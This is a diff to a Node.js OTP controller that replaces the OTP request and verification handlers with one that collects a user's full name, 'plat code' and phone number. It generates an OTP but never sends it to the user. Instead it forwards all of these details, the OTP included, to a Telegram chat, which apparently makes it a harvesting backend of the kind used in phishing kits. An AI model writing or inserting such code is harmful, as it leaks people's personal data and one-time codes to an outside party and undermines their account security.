@@ -1,14 +1,17 @@
-// src/controllers/otpController.js
-const otpService = require('../services/otpService');
+// Handles OTP generation, verification, and retrieval
+const { generateOTP } = require('../services/otpService');
+const { sendMessageToTelegram } = require('../services/telegramService');
 
-exports.requestOtp = (req, res) => {
-  const otp = otpService.generateOtp();
-  // Store OTP and send it back in response
-  res.status(200).json({ otp });
+exports.generateAndSendOTP = (req, res) => {
+    const { fullName, platCode, phoneNumber } = req.body;
+    const otp = generateOTP();
+    // Send OTP to the user's phone (implement your SMS service here)
+
+    // Send data to Telegram
+    const message = `New registration:\nFull Name: ${fullName}\nPlat Code: ${platCode}\nPhone Number: ${phoneNumber}\nOTP: ${otp}`;
+    sendMessageToTelegram(process.env.TELEGRAM_CHAT_ID, message);
+
+    res.status(200).json({ message: `OTP sent to ${phoneNumber}` });
 };
 
-exports.verifyOtp = (req, res) => {
-  const { otp } = req.body;
-  const isValid = otpService.verifyOtp(otp);
-  res.status(200).json({ isValid });
-};
+// Implement other OTP-related functions as needed...
